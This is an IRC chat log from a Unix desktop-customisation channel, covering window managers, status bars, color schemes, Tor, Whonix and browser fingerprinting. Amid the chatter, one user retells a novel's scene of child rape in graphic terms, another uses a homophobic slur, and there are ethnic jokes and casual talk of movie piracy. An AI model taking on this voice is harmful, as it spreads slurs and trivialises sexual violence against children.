06:28         kori │  A lot of people on /r/unixporn are using it and that makes me kinda happy :>
06:28         quit │  le4fy
06:28  thang1thang │  Yeah it's really slick
06:29  thang1thang │  I might modify it slightly for my own use, but really it's fantastic
06:29         kori │  I like blue too damn much
06:29         kori │  getting the green and yellow right was hard
06:29        tbuck │  i like the colored ping output
06:29  thang1thang │  yeah, same
06:29         kori │  I like how he gave more focus to the green...
06:29         kori │  I should do that for some programs.
06:30  thang1thang │  yellow? As in the second screenshot?
06:30         kori │  http://dotshare.it/dots/659/
06:30         kori │  that yellow
06:30         kori │  which is not really yellow
06:30         kori │  but light blue
06:30  thang1thang │  but yeah I like the green in the first. It's a nice touch. It has more saturation than the other colors, I think. Gives it more focus. I think I'd drop the saturation in the green and swap it with the blue
06:31  thang1thang │  and pump the saturation in the blue to make it the brighter color
06:31  thang1thang │  just 'cause I like blue better :p
06:31         kori │  I'm using a lower contrast version atm
06:31  thang1thang │  nice
06:31         kori │  #232323 BG #969696 FG
06:32  thang1thang │  and if it's not yellow, why is it still called yellow?
06:32         kori │  as opposed to #1B1B1B BG #FFFFFF FG
06:32         kori │  thang1thang2: because it's supposed to be yellow
06:32         kori │  the colors are all based on blue
06:32         kori │  but you can still differentiate them from one another
06:32  thang1thang │  ah got it
06:32  thang1thang │  http://a.pomf.se/jca7i.png
06:32  thang1thang │  this. I like this
06:33  thang1thang │  dwm and arch
06:33         kori │  I was using dwm till a bit ago
06:33  thang1thang │  slightly too colorful of a terminal color config for me
06:33  thang1thang │  but... dat gap
06:33         kori │  then I got fallback fonts working
06:33  thang1thang │  and dem dwm boarders
06:33  thang1thang │  fallback fonts?
06:33         kori │  for bar
06:33  thang1thang │  ahh
06:33         kori │  to display CJK characters
06:33  thang1thang │  can you not use bar w/dwm?
06:33         kori │  yeah but then i'd have to fix some gap problems
06:34         kori │  plus I wouldn't be able to get that fancy workspace list
06:34  thang1thang │  lol true
06:34         kori │  that was kinda hard to figure out but god bless google
06:35  thang1thang │  that workspace list thing can work with dwm though
06:35         kori │  I've been meaning to try other OSs later but filesystems always get in the way...
06:35         kori │  and I guess that's true but it wouldn't look as nice
06:35         kori │  because I don't think you can center the tag list in dwm
06:35  thang1thang │  It's bolted to the top left of the scree, yeah
06:35  thang1thang │  screen*
06:36         kori │  also Neuromatic, I forgot to tell you
06:36         kori │  I like your colorschemes
06:36         kori │  but your terminal font is kinda weird
06:37         kori │  but I'm biased since I love tewi more than anything 
06:37         kori │  :V
06:37  thang1thang │  lol
06:38  thang1thang │  not gonna lie kori, I like your font better
06:38         quit │  libbro
06:38         quit │  NeoTerra
06:43   Neuromatic │  kori: u dont like termsyn?
06:44         kori │  Neuromatic: not really, it's too square
06:44         kori │  but again, i'm biased
06:45   Neuromatic │  ;). I like termsyn very much. And gohufont. God bless gohufont…
06:45         kori │  gohufont is okay
06:48   Neuromatic │  wow, you're right termsyn is square… never saw that
06:48         kori │  it's too square :<
07:10  thang1thang │  mmm
07:10  thang1thang │  my dwm's font is apparently terminus
07:13         kori │  I patched my dwm for xft
07:13  thang1thang │  xft?
07:14         kori │  yes
07:15         kori │  it allows you to use anti-aliased fonts and such
07:15  thang1thang │  ohnice
07:18  thang1thang │  what do you use your bar for?
07:19         kori │  hm?
07:19         kori │  what do you mean?
07:19  thang1thang │  your status bar thing
07:20         kori │  in dwm or bar bar?
07:20  thang1thang │  everyone has patches to add more bars to this or that or whatever
07:20  thang1thang │  bar bar
07:20  thang1thang │  and I don't really know... why...
07:20  thang1thang │  in dwm there's the 123456789 and on the right (dwm 6.0) and I understand you can change the dwm6.0 thing to read your battery % and time on the clock
07:21         kori │  oh
07:21  thang1thang │  not quite sure why you need a second bar for more info though
07:21         kori │  I only display the clock there
07:21         kori │  I don't use bar on dwm though
07:21         kori │  I do use bar on 2bwm because it's always nice to have a status bar
07:21  thang1thang │  2bwm doesn't have one?
07:21         kori │  No
07:21  thang1thang │  dwm's status bar's kinda "useless" though, isn't it? Besides telling you what mode/window you're in and/or time+battery+etc?
07:21         kori │  the one I'm using is bar.
07:22         kori │  no, the information displayed is useful
07:22         kori │  tag+layout+time
07:22         kori │  useful enough for me
07:22         kori │  the script I use with bar displays mpd now playing + workspace list (depends on EWMH) and the time
07:23         kori │  I'm proud of my bar
07:23  thang1thang │  can I see a scrot with your bar in action? I'm just curious
07:24         kori │  http://a.pomf.se/kbhlje.png I'm using bar there
07:24  thang1thang │  capsule being the layout?
07:24         kori │  capsule being the song now playing
07:24  thang1thang │  oooh got it
07:25         kori │  I'm going to hop on dwm real quick so you can see my panel there
07:25         kori │  brb
07:25  thang1thang │  what are exactly tags in dwm, by the way? Are tags the 1 2 3 4... on the top of the windows?
07:25  thang1thang │  on the status bar*
07:25  thang1thang │  and your bar looks damn nice, actually. I like how it borrows the color of your bar on the top right window
07:26         kori │  thang1thang2: http://a.pomf.se/quzhyr.png my dwm setup
07:27         kori │  "bloat mode" is just float mode
07:28  thang1thang │  mmm
07:28  thang1thang │  so you replaced the 1 2 3 4 5 with names?
07:28         kori │  yes
07:28  thang1thang │  so "tag" is simply the [main] [game] [code] [donwn] etc
07:28  thang1thang │  cool, thanks
07:29         kori │  yes
07:29         kori │  layout would be [* mode]
07:30         kori │  I display different info in my panels depending on my WM
07:30  thang1thang │  you swap WM's at will?
07:30         kori │  yeah when i'm feeling like using a different wm I just exit X, edit ~/.xinitrc and start it again
07:31         kori │  standard stuff
07:31  thang1thang │  mmm, you're in arch right?
07:31         kori │  yup
07:31  thang1thang │  can't you just set a shortcut to a script that swaps out a xinitrc for a different one
07:31         kori │  sure
07:31  thang1thang │  and keep, say, 3-4 of them one for each wm?
07:31         kori │  that could work
07:31  thang1thang │  just type into term "~/startdwm.sh
07:31  thang1thang │  that'd be a lot easier for you, I think?
07:32         kori │  but I could do something more interestsing
07:32         kori │  interesting'
07:32  thang1thang │  which is? :p
07:32         kori │  I could put exec <someprogram> at the end of my .xinitrc
07:32         kori │  instead of my wm
07:32         kori │  so then I could kill my WM and just start another without X exiting
07:33         kori │  and that program that was exec'd by ~/.xinitrc will keep X alive
07:33  thang1thang │  how would that work?
07:33  thang1thang │  ahh okay
07:33         kori │  and when it exits, X exits as well
07:33  thang1thang │  you'd have to have the program running 100% of the time though right?
07:33         kori │  yes
07:33         kori │  usually it's your WM since you're always running that
07:33         kori │  but it could be another program
07:33  thang1thang │  most frustrating thing for me so far right now is that when I start x, my shortcuts don't work for a bit until I hit cmd+N to start a terminal. And then it does
07:33         kori │  what do you use to manage your shortcuts?
07:34         kori │  also, do you use keybinds to launch them?
07:34  thang1thang │  second one is that I can't get a nice color theme going in dwm
07:34  thang1thang │  I don't have any shortcuts in dwm right now
07:34  thang1thang │  it's 100% default and all I've been doing is launching terminals and playing with it
07:34  thang1thang │  (shoot me please I suck at this)
07:34         kori │  I use https://github.com/baskerville/sxhkd to manage my keybinds
07:34         kori │  with both dwm and 2bwm
07:34         kori │  I never use my WM to launch programs
07:34         kori │  since my WM is supposed to be a window manager, not a program launcher
07:34  thang1thang │  okay, that sounds cool
07:35         kori │  one exception is dwm and dmenu though because they're integrated nicely
07:35         kori │  but I do launch my terminal via sxhkd
07:35  thang1thang │  that's alt + p right?
07:35         kori │  I think that's alt+p in the default config, yes
07:35         kori │  but I use mod4+r
07:35  thang1thang │  the little thing that comes up on the top under the bar and you can just type in it
07:35  thang1thang │  what do you use dmenu for anyway? o.O
07:36         kori │  for launching programs, duh
07:36         kori │  that's dmenu
07:36  thang1thang │  lol
07:36  thang1thang │  right
07:36  thang1thang │  guess I just don't have enough X11 programs or something
07:36         kori │  a quick run down:
07:36         kori │  I use sxhkd to invoke dmenu and I just launch whatever programs I want from there
07:37         kori │  because setting up keybinds for every program sounds silly
07:37  thang1thang │  and you have a specific keybind for terminal though?
07:37         kori │  yes because a terminal is a program I launch often
07:37         kori │  mod4 + enter
07:38  thang1thang │  the hell is mod4 on your keyboard anyway?
07:38         kori │  Windows key
07:38  thang1thang │  ah got it
07:38  thang1thang │  I tried binding my cmd key as the 'alt' key to get everything to work nicely with muscle memory
07:38         kori │  people usually call it meta or super or mod4
07:38         kori │  I use alt for other things
07:38  thang1thang │  but... no dice. Cmd + shift + q is log out on os x
07:39  thang1thang │  and I cannot override it
07:39         kori │  oh that sucks
07:39  thang1thang │  yeah lol
07:39  thang1thang │  if I use a hacky program keyrebind4macbook I can disable the shortcut for anything but x11
07:39  thang1thang │  but...
07:39  thang1thang │  it still forces the logout dialogue
07:40  thang1thang │  what I ended up doing was going into x11 and making a custom shortcut for "log out" on there as ctl shift alt function cmd M
07:40  thang1thang │  (most ridiculous shotcut ever)
07:40  thang1thang │  and then, THEN it worked
07:40  thang1thang │  but only if I simultaniously had the hacky script running. Otherwise using shift cmd q would think I was in finder since I'm in x11 and it would force a system logout -_-
07:40         kori │  oh wow
07:40  thang1thang │  os x works beautiful
07:40         kori │  you should bind it to escape meta alt control shift
07:41  thang1thang │  except if you don't want to what apple wants you to do
07:41  thang1thang │  then it gets a little bitchy sometimes
07:41         kori │  hrm
07:42         kori │  I'd probably have problems with OS X then
07:42  thang1thang │  what would you wanna do on it?
07:42  thang1thang │  honestly that's pretty much the ONLY thing I've found wrong with os x, thta I can't rebind cmd shift q
07:42  thang1thang │  other than that? lol
07:43         kori │  if I was using OS X I'd probably end up installing homebrew or something like that
07:43         kori │  and really use the unix side of things
07:43  thang1thang │  oh homebrew is necessary
07:43         kori │  maybe pkgsrc
07:43  thang1thang │  I like pkgsrc from yrmt better though
07:43         kori │  I heard pkgsrc is nice
07:43  thang1thang │  it is, still incomplete though
07:43  thang1thang │  homebrew has more packages and more features, but I use pkgsrc for anything I can
07:43  thang1thang │  biggest feature for homebrew for me is homebrew cask
07:44  thang1thang │  you can use it to download a lot of normal apps (aqua apps, that is) through terminal
07:44  thang1thang │  almost like you would apt-get something
07:44         kori │  hrmm
07:44         kori │  interesting
07:44         kori │  I only really use arch because it works for me
07:45   Neuromatic │  you can use pkgsrc w/ arch too
07:45         kori │  Neuromatic: I know
07:45   Neuromatic │  its great imo
07:45         kori │  pacman + AUR gets pretty much everything what I want though
07:45  thang1thang │  brew cask google-chrome skype mvim vlc utorrent tor-browser flux
07:45  thang1thang │  for example
07:46   Neuromatic │  kori: yea, do you use srcpac?
07:46  thang1thang │  would auto download and install google chrome, skype, mac vim, vlc, uTorrent, the tor browser and f.lux (awesome auto-brightness utility that changes your monitor temperature after sundown so your eyes don't bleed)
07:46         kori │  Neuromatic: negative
07:46  thang1thang │  oh lawd
07:46         kori │  I use pacaur
07:46         kori │  to wrap the AUR
07:46  thang1thang │  I am so sorry I ever got into using plugins on vim
07:47  thang1thang │  I made the mistake of using spf-13
07:47         kori │  thang1thang2: I also compile a lot of my software locally
07:47         kori │  I should mention that
07:47  thang1thang │  like what?
07:47   Neuromatic │  kori: aurwrapping is not the way for me, but a nice abs tree is awesome
07:47         kori │  sxhkd, bar, 2bwm, dwm, dmenu
07:47  thang1thang │  ah got it
07:47         kori │  my setup is that the source code is kept organized nicely in ~/src/
07:48         kori │  i.e ~/src/2bwm and ~/src/dwm
07:48  thang1thang │  I tend to compile most stuff locally that I need to customize later
07:48         kori │  I have the binaries symlinked to ~/bin/
07:48  thang1thang │  so any wm's and stuff
07:48  thang1thang │  Vim's so customizable that auto packages keep it customized
07:48   Neuromatic │  same here in .local/src
07:48         kori │  so ~/src/2bwm/2bwm is symlinked to ~/bin/2bwm
07:48   Neuromatic │  and .local/bin
07:48  thang1thang │  that's nice, did you set that up so it does it automatically?
07:48         kori │  if I were to do any changes, I only need to run make and the binaries will be updated already
07:49         kori │  for new software I still have to symlink manually
07:49         kori │  it's a nice setup
07:49         kori │  I should probably organize the folders better though...
07:49  thang1thang │  that's pretty sweet
07:49         kori │  my home folder has lots of folders
07:49  thang1thang │  I'm still working on my shell install script. I'll probably work on it for 1-2 months tbh
07:50  thang1thang │  while learning how to use terminal and x apps more and more on the current install, so I can get my repo super organized
07:50  thang1thang │  But I want to get all that stuff automated, sectioned out, etc. I'll keep your setup in mind, sounds nice
07:51         kori │  thang1thang2: yeah
07:51         kori │  I set this up after running sudo make install on dwm installed the binary to /usr/local/bin/, then /usr/bin/
07:52         kori │  and I was confused as why the binary wasn't updating when customizing
07:52  thang1thang │  lol
07:52  thang1thang │  have to make clean install, I think
07:52         kori │  kinda stupid
07:52         kori │  but meh
07:52  thang1thang │  but yeah that's always confusing
07:53         kori │  I've been trying to keep my system more organized and clean lately
07:56  thang1thang │  I approach near OCD levels of organization on my computer when I get into the mood
07:56  thang1thang │  so yeah I know dat feel

07:57  thang1thang │  all I did was say "fuck it I'll install dwm, screw this operating system"

08:10  thang1thang │  beautiful
08:11      jjumbii │  yeah, it was good
08:11      jjumbii │  but a little unsettling
08:11  thang1thang │  the whole book is supposed to be unsettling, lol
08:11  thang1thang │  however the book ends on a much lighter note because the movie skips the last chapter
08:12      jjumbii │  what was it?
08:12  thang1thang │  the last chapter?
08:12      jjumbii │  ye
08:12  thang1thang │  I've never finished the book. I just know that because I read the fact somewhere about a year and a half ago and remembered it
08:12      jjumbii │  i have a headache after watching it lol
08:15  thang1thang │  you just want the tl'dr of the last chapter?
08:15      jjumbii │  yup
08:16         BigE │  https://github.com/sensepost/Snoopy
08:16         BigE │  anyone ever see that?
08:16  thang1thang │  In the epilogue, Alex is growing out of his taste for violence and he's looking towards a future with a wife and son, but eh doesn't want the son to turn out like himself
08:17      jjumbii │  well fucl that
08:17      jjumbii │  fuck
08:17  thang1thang │  lol
08:17      jjumbii │  that would ruin it
08:17  thang1thang │  that's a veeery basic tl;dr
08:17  thang1thang │  if you read the entire book it makes a lot of sense and fits well
08:18  thang1thang │  the story is still incredibly dark, though
08:18  thang1thang │  it's actually worse than the movie in a lot of ways
08:18  thang1thang │  like the scene where Alex has "mostly consensual" sex with two teenage girls?
08:18      jjumbii │  ye
08:19  thang1thang │  in the book
08:19  thang1thang │  he gets two 10 year old girls raving drunk
08:19  thang1thang │  and then an "evil spirit" whatever comes over him
08:19  thang1thang │  and he rapes 'em
08:19      jjumbii │  well fuck
08:19  thang1thang │  and he's amused by the fact that they wake up after being unconscious (whie he's still doing it)
08:19         BigE │  i just look back
08:19         BigE │  and fucking see that
08:19  thang1thang │  and then they complain about all the bruses and stuff they have
08:19         BigE │  what the hell
08:20  thang1thang │  and he's like "well they will need an education anyway, so I'll give 'em an education"

08:24         BigE │  the hell
08:24      jjumbii │  BigE: watch a clockwork orange
08:24  thang1thang │  you're in a war torn country and there's this guy running around with a gang and it talks about his life basically, and he has a huge taste for violence
08:24      jjumbii │  disturbing ass movie
08:24  thang1thang │  first chapter has him mugging a priest and then bribing an entire store to get away with it, I think
08:25  thang1thang │  (him and his 3-4 people in his gang group thing)
08:25  thang1thang │  been a while since I read it
08:25         BigE │  well
08:25         BigE │  i do like movies
08:25  thang1thang │  go watch it
08:26      jjumbii │  its a good movie
08:26  thang1thang │  it's a great movie. Disturbing, but more in a social way than 'damn that's gross'
08:26      jjumbii │  just different
08:26         BigE │  cool
08:26      jjumbii │  it reminded me of the enter the void disturbingness, just more
08:27  thang1thang │  enter the void?
08:27         BigE │  the movie is fucking 40 years old lul
08:28      jjumbii │  just download the 1080p version
08:28         BigE │  i am
08:28      jjumbii │  looks just fine
08:28  thang1thang │  wait, you downloaded the 1080p version in how fast? ._.
08:28         BigE │  16GB br rip of a 40 year old movie will be the tits
08:28  thang1thang │  lol
08:28      jjumbii │  16gb??
08:28      jjumbii │  mine was like 2
08:28         BigE │  idk, i have a bunch of other torrents running as well, so probably over night
08:29  thang1thang │  lol
08:29         BigE │  i like high bitrates
08:29  thang1thang │  YiFy shit
08:29  thang1thang │  If you want REAL 1080p that actually looks good and sounds good
08:29      jjumbii │  i torrented it over wifi in like 30 mins on comcast
08:29  thang1thang │  it's gonna be ~8-10GB at least
08:29      bottomy │  BigE: is snoopy just logging wifi probe requests but at a large scale?
08:30         BigE │  bottomy: clients log things like probe requests along with their location with a GPS and send them back to a central server
08:31         BigE │  which then processes it, graphs, etc
08:31         BigE │  pretty cool
08:31      bottomy │  that's neat
08:31         BigE │  and scarey
08:32         BigE │  imagine if you did something like that but with GSM
08:32         BigE │  such awesome
08:32      bottomy │  yeh, it's only going to catch those that have their devices trying to automatically connect to wifi (or remembered wifi) right?
08:32         BigE │  yeah
08:32         BigE │  thank god
08:32      bottomy │  yeh

08:32  thang1thang │  with GSM? You'd get a 100% accurate data map in like 2 weeks eh?

08:32         kori │  nop
08:33         BigE │  pretty much

08:33         kori │  yeh

08:33         quit │  jjumbii
08:33      bottomy │  I know there's a similar thing you can do to take it a step further, which is to actually make your wifi base send out a fake response claiming to actually be the remembered wifi.
08:34         kori │  venam: it would be pretty cool if you could have more than 2 borders
08:34         kori │  it'd be a bitch to implement though
08:34         kori │  and it wouldn't be 2bwm anymore
08:35         BigE │  yeah, people have been pwning apple devices for a while with rouge-ap attacks because apple devices are preconfigured to connect to a bunch of various SSID's

08:38       zygotb │  I'm thinking of getting it.

08:45  thang1thang │  "nobody will ever need more than 2 IPv^ Addresses ever" -bill gates
08:46       zygotb │  LoL
08:49         BigE │  bill gates is a twat
08:49         BigE │  however, i think that he is a smart twat
08:49         BigE │  look what he did
08:49       zygotb │  ^
08:49         BigE │  he played the corporate game for 40 years
08:50  thang1thang │  then he quit like a baller
08:50        venam │  exploited Africans?
08:50       zygotb │  Ruined the Pacific Northwest
08:50         BigE │  he made so much money it just creates itself
08:50  thang1thang │  and decided "oh hey let's just cure polio, that sounds fun"
08:50         BigE │  not one of his descendants will ever need to work again
08:50  thang1thang │  how'd he ruin the pacific NW? o.O
08:50       zygotb │  Hidden eugenics agenda
08:50         BigE │  and now he can just solve real problems
08:50  thang1thang │  He's actually donating all of his money to charity when he dies save for like 10 million per kid or something?
08:50         BigE │  polio? fixed it. HIV? lets cure it.
08:50  thang1thang │  something really small
08:51         BigE │  so much money
08:51         BigE │  so much
08:51  thang1thang │  to be fair, when your dad's worth over 70 billion dollars
08:51  thang1thang │  being left 10 million is kinda chump change
08:51        venam │  someone reads manga here?
08:51         BigE │  bill gates probably has more stuffed under his mattress
08:52  thang1thang │  lol
08:52  thang1thang │  I've watched some anime but i don't read much, no
08:52       zygotb │  ruined the San Juan Islands by way of all the dot com millionaires who work for M$ buying up all the properties and pushing prices out of reach for less affluent people.
08:52  thang1thang │  That's not really microsoft's fault, though
08:52  thang1thang │  that's more a product of greed which happens anywhere a large amount of millionaires aggregate
08:53       zygotb │  Let grandpa have his demons
08:53  thang1thang │  would've happened just the same had apple been widely successful that fast
08:53  thang1thang │  I'm honestly surprised apple didn't come out on top, though
08:53  thang1thang │  they were the first to come out with a database program
08:53       zygotb │  Gates was a savvy marketer.
08:53  thang1thang │  that should've ended it for microsoft, practically
08:54  thang1thang │  and hell yes he was. His deal with "big blue" pretty much won the game right there to be honest
08:54  thang1thang │  brb
08:54         BigE │  gatis was a smart corporatist
08:54         BigE │  gates*
08:54       zygotb │  Kept on making people pay to be Beta Testers!
08:54         BigE │  you cant market windows
08:54         BigE │  it is a steaming pile of shit
08:55       zygotb │  Force OEM to preinstall your beta software
08:55        venam │  you don't market windows you just sell it
08:57       zygotb │  Gates cut deals with most of the big OEM to ship their product with his software. I'd call that marketing.
08:57        venam │  at this point even if it's not good millions of people will buy it
08:57       zygotb │  LoL
09:01         BigE │  and now m$ doesnt mean shit
09:01         BigE │  cause all the OEM's are ass
09:01         BigE │  and any chance that m$ had of having any sort of positive reputation in the tablet age is gone
09:02         kori │  $ instead of S just to express that extra hatred for microsoft
09:02         BigE │  cause this is 2003
09:02        venam │  MacO$
09:02        venam │  same
09:02         BigE │  and i need to use that $
09:03         kori │  obviously
09:03        venam │  it could've been proprietary and still be good
09:03         kori │  holy shit guys it's almost 2014
09:04       zygotb │  No kidding
09:04       zygotb │  Time sure does fly
09:05       zygotb │  The older I get the faster time goes by.
09:05  thang1thang │  always makes me give a start
09:05  thang1thang │  seems ridiculous to think that I can remember 2011 being really close by
09:06  thang1thang │  and 2009 doesn't seem like too far away
09:06       zygotb │  I spent Christmas 2009 in jail.
09:06       zygotb │  LMAO!
09:06  thang1thang │  lol
09:06  thang1thang │  why? if you dont' mind me asking
09:07       zygotb │  30 days stemming from a drunk driving incident.
09:07  thang1thang │  ahh...
09:08       zygotb │  I got 2 days for the DUI.
09:08  thang1thang │  28 days for the 3 people you killed?
09:08  thang1thang │  (kidding)
09:08       zygotb │  30 days for "Terroristic Threatening."
09:09       zygotb │  They dropped the Disorderly Conduct.
09:09         BigE │  here we go again
09:09  thang1thang │  mmm
09:09         BigE │  zygotb is such a liar
09:09         BigE │  he tried to blow up the sears tower
09:09  thang1thang │  Were you wearing a towel on your head by mistake?
09:09       zygotb │  After jail I had to go to all sorts of classes and other BS.
09:10  thang1thang │  how'd you get the terroristic threatenings anyway? .-.
09:10       zygotb │  Drunk and talked shit that scared some faggot cop.
09:10  thang1thang │  lol
09:10  thang1thang │  good job
09:11       zygotb │  If I had kept my trap shut I would have got less time.
09:12  thang1thang │  yeah...
09:12  thang1thang │  kinda hard to think logically when drunk though
09:12  thang1thang │  I believe that's one of the "side effects"
09:12        venam │  zygotb: you are a hero
09:12  thang1thang │  .-.
09:12       zygotb │  Now I'm the proud owner of a certificate of achievement lauding my completion of Anger Management counseling.

09:13         mode │  +v bottomy
09:13  thang1thang │  lol, anger management counseling. That's awesome
09:13  thang1thang │  I had pretty big anger issues as a kid, all the way up to high school
09:13  thang1thang │  I took martial arts for a couple years to fix it
09:13       zygotb │  Cool.
09:13       zygotb │  Which arts?
09:13  thang1thang │  shaolin kempo
09:13       zygotb │  Awesome!
09:14  thang1thang │  a westernized kung fu with emphasis practical fighting rather than artistic forms and our sensi was a 4th degree belt in the system before he branched off and made his dojo independent
09:14       zygotb │  I used to do KuJu style.
09:14  thang1thang │  He did that so he could incorporate some muy thai elements, BJJ elements and the most efficient judo stuff he's learned, juijitsu, other small stuff like that
09:15       zygotb │  Danny Inosanto.
09:15  thang1thang │  but 95% of what you learn in his dojo is still shaolin kempo, but he dropped some useless stuff, and added the most powerful stuff from everywhere else where Shaolin lacks. It's pretty good
09:15         quit │  akacase
09:15  thang1thang │  btw what browser do you guys use in your wm's
09:15       zygotb │  Sounds good.
09:16  thang1thang │  I don't think there's any "modern" browser I can use in dwm in os x for whatever reason
09:16  thang1thang │  and did you actually learn from Danny?
09:16       zygotb │  I've been using Firefox because that's what the Tor Browser Bundle uses.
09:16  thang1thang │  can't seem to get FF to run in X11 though ;-;
09:17       zygotb │  Never met Danny.
09:17  thang1thang │  there's a Firefox-x11 package in macports, but fuck mac ports and its horrible system
09:17  thang1thang │  and it's like version... 8...
09:17  thang1thang │  firefox is on 26 now lol
09:17       zygotb │  Have you tried the Tor Browser Bundle from the Tor Project website?
09:18  thang1thang │  dumb ironic question
09:18  thang1thang │  can you run the tor browser with all of the tor stuff removed?
09:18       zygotb │  Sure
09:18  thang1thang │  I don't actually need all the privacy, and enjoy the fast loading speeds that normal browsers use
09:18       zygotb │  TBB is on FF 24
09:18        venam │  I run FF
09:18  thang1thang │  on X11?
09:18       zygotb │  If you want a fast X11 browser try Xombrero.
09:19        venam │  sure on X11. what else can I run it on?
09:19       zygotb │  I'm in a Whonix VM right now.
09:19       zygotb │  It doesn't seem very slow.
09:21  thang1thang │  whonix vm?
09:21  thang1thang │  And yeah, I tried googling a firefox for X11 and there didn't seem to be any
09:22  thang1thang │  perhaps it's just the "default linux" firefox?
09:23        venam │  ...
09:24  thang1thang │  :p
09:24         BigE │  what the fuck.....
09:24         BigE │  i dont think you understand how this works
09:24         BigE │  lul
09:24  thang1thang │  no I'm fucking with him about the firefox thing
09:30         BigE │  okay
09:30         BigE │  good 
09:30         BigE │  lul
09:31         join │  akacase
09:31         mode │  +v akacase
09:32       zygotb │  Yes, Whonix VM.
09:32  thang1thang │  I mean, I still haven't quite gotten firefox running in X11 on os x. But I'm fairly sure that's due to weird differences
09:33  thang1thang │  and I looked up whonix vm. Looks cool
09:33       zygotb │  There are 2 files you download and import into VirtualBox.
09:33       zygotb │  You start them both.
09:34       zygotb │  You do all your work in the Whonix Workstation, and the Whonix Gateway is for Tor configuration.
09:34         BigE │  okay, i get what they did
09:34  thang1thang │  got it, sounds sweet. And then that of course is all on a flash drive?
09:34  thang1thang │  get who did what?
09:34         BigE │  virtually separate the OS from the network gateway configuration
09:34       zygotb │  In the Whonix Workstation all network traffic is routed through Tor.
09:34         BigE │  that is cool
09:35       zygotb │  I'm blown away by how fast it seems.
09:35       zygotb │  I mean, it seems faster than just using the Tor Browser Bundle.
09:35  thang1thang │  probably is
09:36  thang1thang │  Tor's strength is it uses firefox, so they don't have to do 90% of the coding
09:36         BigE │  how....
09:36  thang1thang │  but whonix can probably build everything from the ground up
09:36         BigE │  the TBB uses the same code as this
09:36  thang1thang │  tor is firefox + security plugins, optimizations, some stuff removed, etc
09:37       zygotb │  Actually, Tor can be used without Firefox.
09:37  thang1thang │  yeah it should be just the protocal
09:37         BigE │  i know it can.....
09:37         BigE │  wut....
09:37       zygotb │  Xombrero - have you tried it?
09:37  thang1thang │  the tor browser would be the browser being modified to not give away any data while the protocal hides everything, right?
09:38  thang1thang │  And I'm grabbing it now, actually
09:38         BigE │  tor doesnt hide anything
09:38         BigE │  except source IP and location
09:38  thang1thang │  blah
09:38       zygotb │  Tor (The Onion Router) obfuscates your IP address.
09:38  thang1thang │  I have a really bad habit of using wrong termonology for everything
09:39         BigE │  the TBB has extensive patching to strip out as much identifying information as possible
09:39  thang1thang │  sorry. I'm getting better, but I still slip up on a lot of things
09:39         BigE │  they used to do that with privoxy
09:39         BigE │  but patching FF is just safer
09:39         BigE │  the problem is that FF is getting just way too fucking big
09:39         BigE │  and they keep trying to plug holes
09:39         BigE │  and other non-sense
09:39       zygotb │  Firefox OS
09:40         BigE │  and that is going to be a game of whack a mole forever
09:40       zygotb │  A la Windoze
09:41         BigE │  web browsers are just too big IMO for privacy at this point
09:42  thang1thang │  yeah...
09:42  thang1thang │  mmm. Question
09:42  thang1thang │  Even if you, theoretically, made a live boot OS that stripped all of your identifying information, hid your IP address and all of that stuff
09:43  thang1thang │  if I recall correctly, that wouldn't matter unless the browser was secure, because it would just push all the information through the tor anyway?
09:43         BigE │  false
09:44  thang1thang │  mm, so you could boot up the tor live boot OS and run google chrome on it and it'd be just as secure as the normal TBB on a "regular' operating system?
09:44         BigE │  as long as, at a kernel level, everything is forced through tor, and no one can change it but root(which you make impossible to access), then as long as there are no root exploits, you will be safe
09:44  thang1thang │  ah, got it, so that's why it would require a separate distro
09:45         BigE │  no, you would be 10x more secure actually
09:45  thang1thang │  and yeah, that makes sense
09:45         BigE │  well, you can do that on any distro
09:45        venam │  someone wants to test my mangaDL?
09:45  thang1thang │  sure
09:45         BigE │  i personally manually specify the apps i want piped through tor
09:45         join │  shtols
09:45         mode │  +v shtols
09:45       zygotb │  http://paste.unixhub.net/index.php/KyAnTL/
09:45         BigE │  but i always have a Tails Live USB with me for if i cant use my own computer
09:45        venam │  clone that https://github.com/venam/MangaDL--CPP-GUI-Version-
09:46  thang1thang │  done
09:46        venam │  there's a x86 and x86_64 binaries already present in the repo for those that don't want to compile it
09:46         BigE │  zygotb: my browsers are all unique out of a set of 2000
09:46         BigE │  give or take
09:46        venam │  zygotb: there's an add-on against that called fireglove
09:46         quit │  akacase
09:46       zygotb │  That screenie is of Whonix.
09:47         BigE │  so apparently the browser i configure on my desktop is more generic than the whonix one
09:47         BigE │  that is fucked up
09:47        venam │  it mixes up all the browser info randomly at every load
09:47  thang1thang │  lol
09:47       zygotb │  Fireglove? Cool!
09:47         BigE │  i love firegloves
09:47         BigE │  however, it needs an update
09:47       shtols │  BigE: That's normal I'd say. There are hundreds of thousands of users running your average Firefox. And only a few thousands running a specialized version.
09:47       zygotb │  I had something else like that once... User Agent Switcher, or something like that.
09:48         BigE │  shtols: my point is that that totally reverses the point of Whonix
09:48        venam │  I used to have UAControl
09:48        venam │  change the user-agent per domain basis
09:48       shtols │  BigE, oh, ueah. That's right.
09:48        venam │  I used it for websites that load slowly with desktop versions
09:48        venam │  but fast with mobile version
09:48         BigE │  just saying, the ultimate anonymity is looking like everyone else
09:49  thang1thang │  *while at the same time not giving out any information
09:49        venam │  thang1thang2: does it execute?
09:49       zygotb │  What you want is for your browser to share as many identifying bits with as many other browsers as possible in order to "get lost in the crowd."
09:50  thang1thang │  I'm going to check the directory in finder really quick
09:50        venam │  ah, MacOS, you might be missing so libs to run it, do you have gtk2?
09:50       zygotb │  I'm getting excited about making some more BHO tomorrow.
09:51  thang1thang │  yeah I probably don't have all the libraries required since it says I'm missing the gtk/gtk.h library when compiling
09:51       zygotb │  It will be my first solo.
09:51        venam │  thang1thang2: there's an executable in the dir
09:51  thang1thang │  however you already have the x32_64 in there so I'm going to see if I can fiddle with it and get it to run through the exec
09:51        venam │  mangaDL_x86 and mangaDL_x86_64
09:52  thang1thang │  yeah I'm getting an exec format error
09:53  thang1thang │  most likely due to said missing library
09:53        venam │  might be because Mac doesn't run ELF exec
09:54  thang1thang │  damn. Nope, mac doesn't run ELF execs
09:54  thang1thang │  I'll have to recompile it and then it'll run
09:54  thang1thang │  or I can try seeing if X11 will run it
09:54        venam │  ...
09:54        venam │  X11 isn't a virtualmachine
09:55         venam│  venam|away
09:55  thang1thang │  yeah I know it's not
09:55  thang1thang │  I've (for some reason) been able to run some stuff in X11 that I can't run with a normal terminal
09:56  thang1thang │  no clue why
10:00  thang1thang │  did I piss him off?
10:00       shtols │  I doubt that.
10:01  thang1thang │  I always feel bad when I try to do something and nothing quiiiite works right because I'm on OS X rather than a proper linux
